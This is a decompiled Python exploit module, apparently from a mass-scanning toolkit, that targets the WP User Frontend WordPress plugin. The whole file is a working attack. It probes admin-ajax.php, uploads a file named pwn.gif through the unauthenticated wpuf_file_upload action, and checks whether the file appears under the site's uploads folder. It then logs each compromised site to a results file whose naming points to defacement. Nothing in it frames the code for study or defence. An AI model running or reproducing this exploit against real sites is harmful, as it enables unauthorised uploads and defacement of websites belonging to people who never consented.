# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\WP_User_Frontend.py
import requests
import time
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
year = time.strftime('%y')
month = time.strftime('%m')

def Exploit(site):
    try:
        CheckVuln = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=wpuf_file_upload', timeout=5, headers=Headers)
        if 'error' in CheckVuln.content or CheckVuln.status_code == 200:
            post = {}
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            post['action'] = 'wpuf_file_upload'
            files = {'wpuf_file': open('files/pwn.gif', 'rb')}
            try:
                _url = 'http://' + site + '/wp-admin/admin-ajax.php'
                _open = requests.post(_url, files=files, data=post, headers=UserAgent, timeout=10)
                if 'image][]' in _open.content:
                    _Def = site + '/wp-content/uploads/20' + year + '/' + month + '/' + 'files/pwn.gif'.split('/')[1]
                    Check_Deface = requests.get('http://' + _Def, timeout=5, headers=Headers)
                    if 'GIF89a' in Check_Deface.content:
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(_Def + '\n')
                        return printModule.returnYes(site, 'N/A', 'WP User Frontend', 'Wordpress')
                    else:
                        return printModule.returnNo(site, 'N/A', 'WP User Frontend', 'Wordpress')

                else:
                    return printModule.returnNo(site, 'N/A', 'WP User Frontend', 'Wordpress')
            except:
                return printModule.returnNo(site, 'N/A', 'WP User Frontend', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'WP User Frontend', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'WP User Frontend', 'Wordpress')